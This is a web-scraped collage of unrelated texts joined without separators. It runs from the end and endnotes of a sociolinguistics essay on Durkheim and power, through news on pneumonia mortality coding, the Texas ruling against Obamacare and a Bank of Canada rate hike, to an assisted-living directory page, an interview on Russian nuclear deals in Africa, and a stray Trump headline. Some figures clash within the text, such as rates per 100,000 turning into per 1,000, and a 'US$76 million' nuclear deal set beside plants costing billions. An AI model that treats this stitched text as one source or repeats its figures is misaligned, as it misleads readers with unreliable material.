There will be those who ask “where is power in your theories?” The answer is: everywhere. Sociolinguistic evidence, in my view, compels us to embrace Foucault’s conception of power as dispersed, norm-focused and capillary, present in every aspect of social behavior, and crystallized – often in the form of anachronisms, see above – in contemporary modes of institutional governmentality. The latter produce and reproduce, let us note, significant amounts of infrastructural violence (Rodgers & O’Neill 2012), by policing access to the normative resources that (often tacitly, as in the case of standard forms of language and literacy: Hymes 1996) condition the realization of what Bourdieu (1982) called “legitimate language”; or that control, as do the algorithms directing social media traffic, the shaping of communities and the identities of their members. The indexical-polynomic organization of normativity in communication makes power total and inevitable across the entire specter of observation. I believe we need such a view to start addressing – not a minute too soon – the new forms of power, inequality and conflict that now characterize the online-offline world and of which people such as Edward Snowden, Julian Assange and Chelsea Manning, but also Donald Trump, are uncomfortable reminders.
The same answer will be given to those asking “where are gender, race, class, ethnicity in your approach?” There, too, we must see that such diacritics are always present, but rarely alone, usually as part of a polynomic and polycentric pattern of social action in which they co-occur with several other identity resources. As I repeatedly underscored, the “big” sociological category diacritics are not absent (certainly not when we consider institutional governmentality) but they are as a default chronotopically niched and most often complemented by a very broad range of other identity “accents”. Whenever specific identity diacritics are isolated in interaction, they are part of a pattern of generic argumentation that demands careful analysis. I have therefore not hocus-pocused these big diacritics away, and so obfuscated racism, sexism and other forms of social category abuse. I have given them, I believe, a very precise location in social action enabling extremely accurate analysis, which should protect us from loose generalization or over-interpretation. For as Dell Hymes rightly proclaimed: “[i]t is no service to an ethnic group to right the wrong of past exclusion by associating it with shoddy work” (1996: 80).
At the end of the road, the theories I have proposed all revolve around one thing: enabling an accurate description of people’s place in society – of who they are, what they are capable of doing, what they effectively do, and what their actions produce in the way of social effect. I consider this a matter of social justice: a science that neglects, marginalizes or dismisses as irrelevant important parts of what people are and do, is a science doomed to generate a deeply flawed image of society; and a governance based on such science is bound to discriminate, incriminate and exclude. Which explains my radical opposition to Rational Choice and related theories as fundamentally unrealistic instances of sociological imagination, contradicted by all available sociolinguistic evidence. The sociological imagination, we should keep in mind, is a tremendously important and extraordinarily potent political tool; theoretical critique and theoretical reconstruction, therefore, are exercises of substantial “applied” relevance.

Notes
[1] In this text, I shall use the term “sociolinguistics” as a broadly descriptive umbrella term including any approach in which the connections between language and society are systematically explored and in which communication is seen as an activity not reducible to the production of cognitive content. Work to be discussed in what follows might, consequently, more conventionally labeled as linguistic anthropology, pragmatics, applied linguistics, discourse analysis and so forth – and disciplinary sociolinguistics.
[2] There are some notable exceptions; see e.g. Fairclough 1992; Chouliaraki & Fairclough 1999; Coupland 2016; Flores, Spotti & Garcia 2017; Perez-Milans 2017.
[3] Some of the exceptions are reviewed in John B. Thompson’s (1984) Studies in the Theory of Ideology – most prominently Bourdieu, Habermas and Giddens. Thompson himself, of course, also ranks among the exceptions (see especially Thompson 1984, 1990).
[4] Some would say: microsociologists. But for reasons that have to do with the very nature of language, to be discussed at length in what follows, I tend to have strong reservations regarding that facile micro-macro dichotomy. See Collins (1981).
[5] I do not suggest here that we are only Durkheimians: we’re also, equally unwittingly, Weberians, Marxians and Freudians for instance. I choose Durkheim as a point of reference because some of the fundamental concepts he designed are highly useful in the particular exercise I shall undertake here. And as a gesture to express that sociolinguistics, as I see it, has some things to say on fundamental sociological and social-theoretical questions.
[6] Throughout this attempt, I will follow Garfinkel’s understanding of Durkheim (shared by several others) as concerned with empirical detail rather than conceptual generalization, and with what Durkheim called “the objective reality of social facts” as something that can be demonstrated by attending to concrete, situated and embodied instances of social (inter-) action (see e.g. Garfinkel 2002). There are, therefore, aspects of Durkheim’s work that I shall not mention and discussions on the interpretation of his work that I shall not involve myself in, for I do not need all of Durkheim’s work nor any interpretation of it in order to make the points I intend to make.
[7] Observe that Durkheim, although generally seen as a conservative thinker, was not a reactionary. The society he wished to help construct was a new one, not a (mythical) older society which needed to be preserved or recovered. Durkheim saw the present as unstable and unreliable, an old world that had vanished while a new one had not yet taken solid form and was moving in negative and destructive directions. His rejection – a moral rejection – of the present is quite radical, and contrasts remarkably with that of his contemporary Simmel (1950), who viewed similar tendencies with a neutral, nonjudgmental gaze, as a challenge rather than as a problem.
[8] While Durkheim spends considerable efforts distinguishing sociology from psychology, much of his work articulates an outspoken interest in processes of individual internalization of social facts.
[9] This insistence on temperance and moderation, often presented as evidence of his politically conservative and bourgeois views, can also be seen as another feature of his analogy between secular and (Christian and Jewish) religious moral systems. Foucault (2015: 240) concludes his course on The Punitive Society with this caustic remark:
“[Power] is hidden as power and passes for society. Society, Durkheim said, is the system of the disciplines, but what he did not say is that this system must be analyzed within strategies specific to a system of power.”
Foucault saw the normative-disciplinary complex emerging in the 19th century as a core feature of the developing capitalist mode of production, and Durkheim’s work on the division of labor as a codification of this process, in which he “normalized” a system of power specific to and instrumental for this new mode of production.
[10] Parsons (1937) is the most influential reformulation of Durkheim’s sociology. But Parsons was not alone in seeking completion of the Durkheimian project. To name one already mentioned, it is hard not to see Foucault’s sustained effort to describe and delineate the emergence of the modern “normal” individual through forms of discipline as an idiosyncratic engagement with some of Durkheim’s unfinished business. See e.g. Foucault (2003, 2015). Likewise, one can profitably read e.g. Bourdieu’s Distinction (1984) as an elaborate engagement with Durkheim’s notions of social cohesion and anomie.
[11] Much of the pioneering literature on “late” or “Post”-Modernity implicitly takes this Durkheimian-Parsonian integrated society as its benchmark. Thus, for example, Zygmunt Bauman’s “liquid modernity” evidently takes a “solid modernity” as its point of departure (Bauman 2007). Whether such a solid modernity was ever a reality rather than a projection of a specific sociological imagination remains an untestable research question, although works such as E.P. Thompson’s The Making of the English Working Class (1968) strongly suggest that the degree of integration of our societies in an earlier stage of their development may have been grossly overrated.
[12] Needless to say, Parsons’ view of US society as integrated was fundamentally challenged, and some will say shattered, by Gunnar Myrdal’s monumental American Dilemma (1944).
[13] Judging from Durkheim’s (1897 [1951]) discussion of “egoistic suicide”, anomie is, in effect, a killer.
[14] The few attempts to use Rational Choice in sociolinguistic work were rather epic failures in social analysis. Carol-Myers-Scotton’s Social Motivations for Codeswitching (1993) used an awkward conception of Rights-and-Obligations sets attached to “codes”, from which speakers would rationally choose the most advantageous one; the actual social settings in which code-switching occurs was dismissed as accidental, not fundamental (see Meeuwis & Blommaert 1994 for an elaborate critique); in David Laitin’s Language Repertoires and State Construction in Africa (1992), an equally awkward variety of Game Theory is used to arrive at an ideal, rational “3+1 language outcome” for language policy in Africa. The argument is entirely detached from anything that ties languages to real social environments.
[15] The assumption seems to be: since we all do it, there is no need to study it. Hence Hymes’ critical views of the communication-focused work of Bourdieu and Habermas – two exceptions to the rule just sketched here (Hymes 1996: 52-56). My own verdict on Bourdieu is significantly more merciful (Blommaert 2015a). As for Habermas’ Theory of Communicative Action, (Habermas 1984), I share Hymes’ critique. Hymes points to the abstract and normative-idealized treatment of communication patterns in the work of both, detecting a lack of sensitivity to the actual ways in which language functions in real social environments. Habermas can be said, at most, to specify a set of ideal normative preconditions for communication.
[16] Saussure, who attended lectures by Durkheim, already pointed to “a grammatical system that exists virtually in every brain, or more precisely in the brains of a community of individuals; because language is never complete in any individual, it exists in its perfect state only in the masses” (1960:30; French original, my translation). Observe here how Saussure adopts Durkheim’s concept of “social fact” and, as we shall see, deviates strongly in this from the methodological individualism characterizing many subsequent developments in linguistics.
[17] I cannot enter into detail here, but the well-known Gricean Maxims (Grice 1975) assume cooperativity in communication as a given – in general, we want to understand and be understood whenever we communicate – and there is an entire tradition of “Accommodation Theory” in which speech convergence between interlocutors is studied (Giles, Coupland & Coupland 1991). Cooperation is also the central assumption to most of Conversation Analysis (e.g. Schegloff, Jefferson & Sacks 1977).
[18] Knowledge practices in science are no exception, and there is a large methodological literature criticizing the claims to objectivity made in various branches of science. Aaron Cicourel’s Method and Measurement in Sociology (1964) famously confronted mainstream statistical research with the problems of inevitable subjectivity in interaction. His critique had a profound effect on Bourdieu’s methodology as well, and for Bourdieu, the only possible road to objectivity was the recognition of subjectivity in knowledge construction (Blommaert 2015a; for a cognate argument see Fabian 1983).
[19] Note that “dialect” in the traditional sense is a notion that has come under fire from language-ideologically inspired linguistic anthropology. Gal (2016: 117) observes that varieties defined on the basis of situation of use – “registers” – are hard to distinguish from those associated to spatial identity – “dialects” and “sociolects”; Silverstein (2016) adds to this a historical reanalysis showing how traditional dialect research can, and should, be reformulated as concerned with enregisterment. This idea was of course a central assumption in Agha (2007b) as well.
[20] Without too much comment I can observe that this view obviously clashes with the notion of the “ideal speaker/hearer” that became the hallmark of Chomskyan linguistics, see above. What follows can be read as a simple empirical refutation of this notion.
[21] Foucault (1969) coined the term “archive” to identify the limits of what can be conventionally thought and understandably communicated: if we communicate within the archive, we are “normal” and others will understand us; if we communicate outside the boundaries of the archive, chances are that others will qualify us as lunatics. See Blommaert (2005: 99-103) for a discussion.
[22] Many of these forms of language testing could doubtless be categorized as forms of “power without knowledge”, to use David Graeber’s terms, “where coercion and paperwork largely substituted for the need for understanding (…) subjects” (2015: 65). The benchmarks of such testing modes are usually fictitious “standard” forms of language, imagined levels of competence, and ludicrous projections of degrees of fluency onto broader sociopolitical levels of citizenship. This form of science fiction, nonetheless, has become increasingly prominent as an instrument of power and exclusion in the field of migration, almost everywhere.
[23] One can invoke the authority of Arjun Appadurai here: “This theory of a break – or rupture – with its strong emphasis on electronic mediation and mass migration, is necessarily a theory of the recent past (or the extended present) because it is only in the past two decades or so that media and migration have become so massively globalized, that is to say, active across large and irregular transnational terrains” (1996: 9).
[24] I reiterate here an assumption already voiced by Anthony Giddens (1976: 127): “(…) language as a practical activity is so central to social life that in some basic respects it can be treated as exemplifying social processes in general” (italics in original). This assumption, in Giddens’ work, doesn’t lead to a structured attention to this “practical activity”, though. See the discussion in J.B. Thompson (1984: chapter 4).
[25] It can therefore also be read as a gloss for what we elsewhere describe as “superdiversity”. See Arnaut (2016); Arnaut et al (2017); Blommaert & Rampton (2016).
[26] Odile Heynders (2016), in an insightful study, examines how such diasporic public spheres have altered the nature and impact of writers as public intellectuals. A variety of “traditional” social roles is affected by this transformation of the public sphere in which global rockstar status is no longer the privilege of sports and entertainment professionals (including US presidents), but now includes the likes of Thomas Piketty, author of a not-too-easily-readable book. Piketty is not the first scientist reaching global celebrity status in spite of the fact that very few of his admirers are able to say what exactly he is arguing for in his work – think of Einstein a century ago – but his fame remains a very rare phenomenon, certainly in a culture in which argumentative complexity is increasingly dispreferred.
[27] It is very much worth underscoring this, because of the exceedingly abstract (and unrealistic) ways in which norms and values are being discussed in much academic work and most public debate. Durkheim’s own perspective, to his credit, was radically empirical and opposed to a priori generalization (Durkheim 1961: 26).
[28] One can profitably compare the view articulated here with Agha’s (2007) concept of “stereotypes” (or “models”, Gal 2016) – indexical complexes to which we orient whenever we communicate and that provide the referenced “type” of identity of which we provide “tokens” in our actual communicative conduct. One will find amidst overwhelming agreement two small differences. I emphasize the scaled multiplicity of such “stereotypes” – the polynomic nature of social conduct – and suggest a far broader behavioral field of ratification and uptake to be in play. In that sense, I am more inclined towards Symbolic Interactionism than Agha would, I presume, allow.
[29] One can think of the many energetic debates throughout the 20th century on the concept and validity of social class as a key sociological notion. Attempts towards ‘inventing’ new or additional social classes were consistently met with hostility – see, for examples, C. Wright Mills’ (1951) description of an emerging “White Collar” class, and Guy Standing’s (2011) proposal for seeing the ‘precariat’ as a class-on-the-way-in.
[30] With this quote Erving Goffman opened his PhD dissertation, and much of Goffman’s work can thus be seen as engaging with the baseline “sociation” processes Simmel outlined, developing within “less conspicuous forms of relationship and kinds of interaction”. I am grateful to Rob Moore for pointing this out to me.
[31] We see affinities here between Simmel’s methodological view and phenomenology, especially Husserl’s discussion of the “life-world” as the subjective basis for objectivity (Backhaus 2003).
[32] Trumps own media strategy is sure to become a topic of research in future years as well. Trump systematically rejected what he called “mainstream mass media”, claiming they were biased, and waged an intensive social media campaign – leading to frequent allegations of “fake news”. See Maly (2016) for a first appraisal.
[33] Nik Coupland walks into the trap of such false antagonism: “We may have reached a metatheoretical peak in the fetishising of mobility and the antagonistic critiquing of structure, stability, and stasis” (2016: 440 and discussion 440-442).
[34] The link between these issues and security concerns cannot be explored fully here, but has been extensively documented and discussed in e.g. Rampton 2016b; Charalambous et al 2016; Khan 2017.

Pneumonia Death Rate Drop May Not Be Real
by John Gever
Senior Editor, MedPage Today
April 04, 2012
Action Points
An apparent decline in pneumonia mortality rates may actually reflect changes in diagnostic coding, rather than improvement in real-world outcomes.
Note that medical charts for patients with severe pneumonia increasingly listed non-pneumonia conditions, most commonly sepsis, as the primary diagnosis over time.
An apparent decline in pneumonia mortality rates may actually reflect changes in diagnostic coding, rather than improvement in real-world outcomes, researchers said.
From 2003 to 2009, patients hospitalized with pneumonia listed as the principal diagnosis decreased significantly, but the number with pneumonia as a secondary diagnosis with sepsis as the primary diagnosis soared, according to Peter K. Lindenauer, MD, of Baystate Medical Center in Springfield, Mass., and colleagues.
When age- and sex-adjusted inpatient mortality was calculated not only for patients with a primary pneumonia diagnosis, but also for those with sepsis or respiratory failure as primary diagnoses and pneumonia listed second, it actually increased slightly during the study period, the researchers reported in the April 4 issue of the Journal of the American Medical Association.
Lindenauer and colleagues indicated that, according to their analysis of Nationwide Inpatient Sample data, charts for patients with severe pneumonia increasingly listed non-pneumonia conditions -- most commonly sepsis -- as the primary diagnosis over time.
Next: High-Flow Oxygen Improves Infant Bronchiolitis Outcomes
"Changing patterns in diagnostic coding provide reason to doubt that improvements in the mortality of patients with a principal diagnosis of pneumonia accurately reflect trends in pneumonia outcomes," the researchers wrote.
Previous analyses of inpatient mortality among patients with pneumonia had suggested a steep decrease, which Lindenauer and colleagues found suspicious because there had been no major change in treatment that could account for it.
They analyzed Nationwide Inpatient Sample data on about 1.9 million patients hospitalized from 2003 to 2009 in three diagnostic categories:
Pneumonia as a primary diagnosis
Sepsis as primary diagnosis with pneumonia as secondary diagnosis
Respiratory failure as primary diagnosis with pneumonia as secondary diagnosis
As in earlier studies, they found that hospitalizations in the first category declined substantially during the period from 5.5 per 100,000 population in 2003 (95% CI 5.4 to 5.7) to 4 in 2009 (95% CI 3.9 to 4.2).
But hospitalization in the second category skyrocketed from 0.4 (95% CI 0.4 to 0.4) to 1.1 per 100,000 (95% CI 1.0 to 1.1). This was a 177.6% increase, the authors reported.
Hospitalization increased slightly in the third category from 0.4 (95% CI 0.4 to 0.5) to 0.5 (95% CI 0.5 to 0.5).
However, when the 3 groups were combined, the hospitalization rate declined only 12.5%, from 6.3 to 5.6 per 1,000, while the age- and sex-adjusted inpatient mortality rate increased from 8.3% to 8.8% for an absolute risk increase of 0.5% (95% CI 0.1%-0.9%) and a relative risk increase of 6% (95% CI 3.3%-8.8%).
Over this same time frame, the age-, sex-, and comorbidity-adjusted mortality rate declined from 8.3% to 7.8% for an absolute risk reduction of 0.5% (95% CI 0.2%-0.9%) and a relative risk reduction of 6.3% (95% CI, 3.8%-8.8%).
After adjusting for age and sex, in-hospital mortality for those with a primary pneumonia diagnosis fell substantially from 5.8% (95% CI 5.6% to 5.9%) to 4.2% (95% CI 4.0% to 4.3%).
Lindenauer and colleagues suggested that future studies of pneumonia outcomes using administrative data need to take coding practices into account, and also other conditions common in patients with sepsis, which may frequently be chosen as their principal diagnosis.
"Ongoing efforts to measure and compare the performance of hospitals, such as those currently being carried out by the Centers for Medicare and Medicaid Services, may also be biased if there is variation across hospitals in their use of the sepsis and respiratory failure codes," Lindenauer and colleagues noted.
In an accompanying editorial, two researchers from the University of Iowa in Iowa City agreed that studies relying on administrative data for diagnoses are fraught with this kind of peril.
"This study highlights the importance of understanding nuances and vagaries of administrative data to evaluate trends over time or compare clinician performance," wrote Mary S. Vaughan Sarrazin, PhD, and Gary E. Rosenthal, MD.
"Because administrative data are derived from claims submitted by clinicians to receive payment, the selection of primary and secondary ICD-9-CM codes in administrative data is often driven by reimbursement policies," they noted.
"Moreover, the diagnosis codes change over time, and advances in diagnostic technologies may affect the likelihood that certain diagnoses will be identified clinically and then recorded on administrative claims," they said.
Vaughan Sarrazin and Rosenthal added that the ICD-10 system would "provide greater specificity" in diagnostic coding, but emphasized that "the potential for misleading interpretation" would still remain in studies based on administrative data.
In addition to these problems, Lindenauer and colleagues indicated that their analysis was subject to other limitations: it was limited to hospitalized patients and therefore is not generalizable to outpatients, and only in-hospital deaths were included in the data.

Healthcare in the United States has become a major constituent of its political landscape, which was quite apparent in the November midterm elections. A controversial court ruling striking down Obamacare resurrected a disagreement amongst Americans and the political parties.
On Friday, a federal judge in Texas ruled the Affordable Care Act unconstitutional, and fulfilled an eight-year–long desire of the conservatives.
Earlier this year, Republican officials in 20 states led by Texas Attorney General Ken Paxton in a lawsuit argued that the Obamacare requirement for people to have health insurance — known as the individual mandate — is unconstitutional, and therefore, so is the entire law.
District Judge Reed O’Connor issued a 55-page opinion in a lawsuit, declaring that the individual mandate was unconstitutional. He wrote, “The court finds the individual mandate can no longer be fairly read as an exercise of Congress’s tax power and is still impermissible under the interstate commerce clause ― meaning the individual mandate is unconstitutional…. [T]he court finds the individual mandate is essential to and inseverable from the remainder of the ACA.”
The court ruling is being considered as an explosive with the potential of shaking up President Donald Trump, as he looks forward to run for re-elections in 2020. Legal experts anticipated that the case may not be resolved in the courts before 2020, and could possibly become a defining issue in the race for the White House and Congress.
Trump said that the federal judge’s decision came as an early Christmas gift that clears the decks for a health care plan in the new year. “Wow, but not surprisingly, ObamaCare was just ruled UNCONSTITUTIONAL,” he tweeted on Friday. “Great news for America!”
Andy Slavitt, who oversaw Obamacare implementation in the Obama administration, said, “When Trump says this is ‘great for America,’ he’s forgetting the healthcare driven whipping Republicans got in the midterms.”
“Rather than let that heal, he’s making healthcare a 2020 prime fight and also putting Republicans in the Senate at great exposure,” he added.
While President Trump celebrated the court ruling, his administration was quick to highlight that the current law remains in effect, as of now. The administrator for the Centres for Medicare and Medicaid Services, Seema Verma wrote on Twitter, “The exchanges are still open for business.”
Meanwhile, Democrats warned that the Republican-led lawsuit that sought to invalidate popular parts of Obamacare — protections for pre-existing conditions and a ban on annual lifetime limits — has put the healthcare coverage for millions of Americans at stake. Moreover, provisions that affect wider health insurance market, such as keeping adults on their parents’ policies until age 26, are also at risk.
These elements have remained crucial and widely popular in the suburban areas that expressed criticism towards Republicans in November’s mid-term elections.
In the midterm elections in 2018, Democrats highlighted the attempts of rival Republicans to get rid of Obamacare’s consumer protections, a strategy that offered bonuses as the party won 40 House seats.
House Speaker-to-be Nancy Pelosi said the ruling “exposes the monstrous endgame of Republicans’ all-out assault on people with pre-existing conditions and Americans’ access to affordable healthcare.”
Healthcare has been the major issue that the Republicans struggled with during the midterm elections campaign. On one hand, they vowed to back protections for Americans with pre-existing conditions, and issued a lawsuit that would undo those provisions on the other.
According to the House exit polls published by CNN, the most crucial issue to Americans was healthcare with a nearly two-to-one margin, while those who referred to it preferred Democrats over Republicans by a striking 52-point margin.
One of the prominent Republican ally of the president said that healthcare could become Trump’s “Achilles heel” in 2020, when he’s up for re-election.
Former Republican congressman, David Jolly said, “I’m not sure Republicans even know what they’re fighting for right now when it comes to healthcare.”
On Saturday, Former President Barack Obama responded on social media, calling the decision “a reminder that Republicans will never stop trying to undo” the protections offered by his signature health care law.
Some Republicans, including Senator Susan Collins, also opposed the GOP’s attempts to strike down Obamacare. “I think this will be overturned on appeal,” Collins said on Sunday, adding, “There’s no reason why the individual mandate provision can’t be struck down and keep all the good provisions of the Affordable Care Act.”
The Friday court ruling has been considered an occasion of celebration by President Donald Trump, as well as majority of the Republicans. However, many have speculated that their attempts might prove to be risky for GOP in the 2020 presidential polls, as healthcare is increasingly becoming a major concern for the people of America.
It is definitely a deceptive victory for Trump administration, as the situation might turn for worse. While he should have simply opposed a single provision of Obamacare, striking down the entire Bill is just a move taken out of rivalry.

Assisted Living Laguna Niguel
Laguna Niguel city is located in Orange County, California State, US.
Assisted living in Laguna Niguel as it exists today emerged in the 1990s as an California eldercare alternative on the continuum of care for people, for whom independent living is not appropriate but who do not need the 24-hour medical care provided by a nursing home and are too young to live in a retirement home. Assisted living is a philosophy of care and services promoting independence and dignity.
Laguna Niguel Time Zone is PST and Area code, to make phone calls to a Laguna Niguel Assisted Living Home, is 949

Laguna Niguel Assisted Living - California
Zip Code is 92677 and Currently there are 3 assisted living homes and senior care homes in our database for Laguna Niguel City.
A distinction is generally made between Laguna Niguel medical and non-medical care, care provided by people who are not medical professionals. The latter is much less likely to be covered by insurance or public funds. In the US, 67% of the one million or so residents in assisted living facilities pay for care out of their own funds. The rest get help from family and friends and from state agencies. Medicare does not pay unless skilled-nursing care is needed and given in certified skilled nursing facilities or by a skilled nursing agency in the home.
Laguna Niguel Assisted living facilities usually do not meet Medicares requirements. However, Medicare does pay for some skilled care if the elderly person meets the requirements for the Medicare home health benefit.

Nuclear Power in Africa?
Ann Garrison, BAR contributor
11 Jul 2018
Satellite photo.... Africa at night
“Sub-Saharan Africa faces an extraordinary level of energy poverty.”
Rosatom—Russia’s state nuclear energy corporation—has recently signed Memorandums of Understanding (MOUs) with a number of African nations to build nuclear power plants within their borders. I spoke to David Himbara, a professor of international development and African energy activist, about the likelihood of Rosatom actually building these nuclear plants.
Ann Garrison: In your Medium essay “Kagame’s Nuclear Power Plant Is a Joke,” you say that the cost of a nuclear power plant would be equivalent to Rwanda’s national budget for three years. Why do you think he’s proposing anything so preposterous?
David Himbara: Rwandan President Paul Kagame is always hunting for the global limelight. He seems to believe that he must validate his supposedly visionary and innovative leadership by pronouncing grand projects that rarely materialize. Of late he has jumped on the bandwagon of African heads of state attempting to fight energy poverty with nuclear-generated electricity.
AG: What other African nations have signed these MOUs with Rosatom?
DH: Other African nations that have signed MOUs with Rosatom include South Africa, Namibia, Nigeria, and Uganda. Kenya too is working with Russia on this.
AG: Why do you think these countries are pursuing nuclear power instead of safer renewable energy?
DH: I think it is a sign of desperation. Currently, Sub-Saharan Africa faces an extraordinary level of energy poverty. Of the region's 1 billion people, 620 million have no electricity. Worse still, about 80% of the region’s population still cooks with solid biomass. According to the International Energy Agency (IEA), of the 25 countries in the world where more than 90% of the population cooks with solid biomass, 20 are in Sub-Saharan Africa. It is these realities that are forcing African governments to explore all options to confront energy poverty.
AG: It’s hard to imagine this makes sense at all if you consider the environmental consequences. Nuclear waste will pile up, and where are they going to put it? The Sahara? The US is always trying to force a nuclear waste repository on some poor or indigenous community here and when that fails, the waste keeps piling up at the reactor sites, creating greater and greater risk of release because of an earthquake or some other sort of disaster or accident. And that’s aside from the tragic environmental damage caused by uranium mining and the possibility of an African Chernobyl or Fukushima.
DH: Managing nuclear waste and safety is universally complex and dangerous. The Chernobyl disaster reminded the world of the human and environmental costs of nuclear power accidents. South Africa’s Koeberg nuclear power station, the only nuclear power plant in Africa, has been incident-free in its 34-year operations. As for the future, we have to wait and see which other African countries will build nuclear power plants.
AG: And how likely is it that any of these African nations will succeed in building nuclear power plants?
DH: South Africa is the only country on the African continent that already has a commercial nuclear power plant. With two reactors, South Africa’s Koeberg nuclear power station generates nearly 2,000 megawatts of electricity. This accounts for around 5% of South Africa's electricity production. South Africa also has a research reactor located at the Pelindaba Nuclear Research Center in Gauteng Province.
Before Jacob Zuma was removed as South African president, he had already signed a US$76 million deal with the Russians to build a new nuclear power plant. This deal was one of the reasons why Zuma fell. For example, when Zuma signed the deal with the Russians, his minister of finance refused to sign off. Zuma dismissed the minister. From there it was downhill for Zuma, who subsequently lost power.
“Namibia has 6% of the world’s uranium resources.”
Other countries appear to be pressing ahead. Nigeria, Ghana, Senegal, Kenya, Uganda, Tanzania, Zambia, and Namibia appear in the Emerging Nuclear Energy Countries. Meanwhile, Namibia has 6% of the world’s uranium resources, which obviously constitutes an advantage.
AG: What about the cost? Nuclear reactors are not cheap. Can any African governments hope to finance this ambition?
DH: That is a good question. For South Africa, which already has a nuclear plant and 34-years experience running it, plus a relatively large economy of $349 billion GDP, the cost is manageable. Nigeria and Namibia could also afford the cost. What is a mystery is how countries like Rwanda could afford it. A nuclear power plant costs no less than $9 billion, and many cost more. And that does not include maintenance and expertise to run the plant.
AG: Rosatom is reported to hold the largest portfolio of foreign construction contracts in Russia, and I think we can assume that they’re just trying to make money, but what do you think is motivating the African leaders?
DH: As I mentioned already, African countries are facing catastrophic levels of energy poverty. That is the push factor for exploring the possibility of nuclear power.
AG: I know anyone reading this would think I had done a bad job if I didn’t ask whether you think African leaders are motivated to go nuclear because of what NATO did to Libya after Gaddafi gave up his nuclear capability? Nuclear power plants and nuclear weapons are inextricably intertwined.
DH: Historically, nuclear power evolved within political power rivalries initially between Germany and USA during the Second World War. The nuclear rivalry then shifted into the Cold War between the United States and the Soviet Union and their respective regions of influence. Separate from this was the India-Pakistan nuclear rivalry. Other countries acquired nuclear power, including China and North Korea. There were other countries eager to acquire nuclear capabilities—Iraq, Iran, and Libya.
The African scenario I have outlined here is different— the pursuit of nuclear energy is to fight energy poverty.
AG: Does the cost of building nuclear power make any sense when compared to the cost of building renewables or other sources of energy to solve Africa's energy shortages?
DH: That is indeed the question. The renewable energy potential in Africa is enormous. Take for example the Grand Inga Dam in the Democratic Republic of Congo. Grand Inga is the world’s largest proposed hydropower scheme. It is the centerpiece of a grand vision to develop a continent-wide power system. Grand Inga is expected to have an electricity-generating capacity of about 40,000 megawatts – nearly twice as much as the 20 largest nuclear power stations.
AG: When I've read about big power plant projects in the Global South, it usually seems that they're being built to power industrial mining and other forms of resource extraction, although the government and the builders say they're trying to bring electricity to those without. I read about a plan to build a grid that would transport electricity all the way across DR Congo—from Grand Inga Dam on its western border to mineral-rich Katanga Province on its southeastern border—to power industrial mines. Am I overly cynical?
DH: Grand Inga, as I just described, is not limited to the mining industry. The proposed hydropower scheme is the centerpiece of a grand vision to develop a continent-wide power system. This was conceived as a priority project for the New Partnership for Africa’s Development (NEPAD). The Southern Africa Development Community (SADC), which includes DRC, East African Power Pool (EAPP) and ESKOM, Africa’s largest power utility, were part of the Grand Inga vision. Perhaps the most interesting question is why Grand Inga has stalled, but that is a large question in itself, for another day.

Bank of Canada raises rates as Poloz’s tale of recovery from Great Recession finally starts coming true
Tumblr

Bank of Canada Governor Stephen Poloz’s tale about how the economy would recover from the Great Recession is finally coming true.
The central bank ignored Donald Trump’s trade vandalism and raised its benchmark interest rate a quarter point to 1.5 per cent on July 11.
It did so mostly because of an unexpected jump in business investment and exports this year, two growth engines that Poloz said in 2013 would drive Canada’s battered, post-crisis economy back to better days. Instead, those motors sputtered, forcing the central bank to keep interest rates low. That left the burden of economic growth on Canada’s debt-addled households, which did their duty and kept spending.
The economy stayed afloat, but at the expense of record levels of private debt that now threatens future growth. But at last, Corporate Canada appears to have taken the baton.
“The composition of growth is shifting,” the Bank of Canada said in its policy statement. “Exports are being buoyed by strong global demand and higher commodity prices. Business investment is growing in response to solid demand growth and capacity pressures, although trade tensions are weighing on investment in some sectors.”
Almost everyone on Bay Street anticipated the move, albeit it took some longer to come around. A minority continued to insist the central bank should have left borrowing costs unchanged to create a cushion against the U.S. president’s next batch of punitive import duties. On the eve of the interest-rate announcement, the U.S. escalated its trade war with China, scheduling tens of billions in additional duties.
Canada is also on Trump’s hit list. The central bank now reckons the combination of U.S. duties on Canadian lumber, newsprint, aluminum, and steel — and the chilling effect of trade uncertainty on investment — will subtract two thirds of a per cent from gross domestic product by 2020, an increase from its previous estimate in April.
That’s the equivalent of about $12 billion, so it’s not nothing.
But the bigger story in the Bank of Canada’s new Monetary Policy Report is that most companies are responding to their order books rather than the headlines in the business pages. Policy makers significantly upgraded their outlook for business investment and exports, offsetting weaker household consumption. Hard evidence of that sort proved more compelling than Trump’s tweets. Poloz and his counterparts on the Governing Council ultimately ignored those who argued that interest rates should be left alone, although the governor chose to address the Nervous Nellies directly at a press conference after the decision.
“There was speculation that the bank would not move interest rates today because of the possibility of further trade measures,” the governor said in the opening statement, which the central bank uses to provide context and correct popular misconceptions. “The bank cannot make policy on the basis of hypothetical scenarios. We felt it appropriate to set aside this risk and make policy on the basis of what has been announced.”

It’s incongruous that the long-awaited rotation to exports and investment is happening amid the early stages of a global trade war. Alas, the Trump Effect is a complicated thing. The president’s trade policy represents the biggest threat to Canada’s prospects, and his fiscal policy is responsible for a temporary surge in demand for Canadian exports. The Bank of Canada revised its forecast for U.S. economic growth in 2018 to 3.1 per cent this year from an April outlook of 2.7 per cent, reflecting the stimulative power of Trump’s tax cuts.
Economists will tell you that it is difficult to overcome economic gravity. Canadian executives are undeniably worried about the future, and some are either delaying expansions or shifting production in ways that will avoid Trump wrath. Yet as more data comes in, it is becoming clear that most Canadian companies are rallying to meet an influx of orders.
The improvement in investment and exports was so strong that the Bank of Canada was forced to raise the pace at which it thinks the economy can grow without triggering inflation. The new potential growth rate for 2018 is 1.8 per cent; the figure for 2019 and 2020 is 1.9 per cent.
All things equal, the revision suggests the central bank will be less pressed to raise interest rates in the future. The central bank aims to keep inflation advancing at an annual rate of about 2 per cent, which it thinks it is on track to achieve over the next couple of years, although it said inflation may jump temporarily due to a combination of higher gasoline prices, increased minimum wages, tariffs, and a weaker currency.
“I don’t think they are trying to stop the economy,” Chris Catliff, chief executive at BlueShore Financial, a credit union in Vancouver, told me in an interview after the Bank of Canada’s announcement. “It’s really about trying to normalize interest rates. They are doing the right thing.”
Stronger exports and investment are offsetting weaker spending by households, which have slowed their accumulation of credit. The Bank of Canada predicted GDP will increase 2 per cent this year. That’s the same as its last estimate, but that growth now is being driven by different engines. Consumption will account for 1.3 percentage points of that growth, less than expected earlier this year. Business investment will account for 0.7 percentage point of the GDP increase, and exports 0.5 percentage point, the central bank estimates. Both are big increases from the April outlook.
The threat of increased protectionism means it would be folly to predict a fairy-tale ending. Still, the story being written on the ground in the Canadian economy appears to be different than the one you’ve been reading about in recent months.

A Defiant Trump Doubles Down on Charlottesville
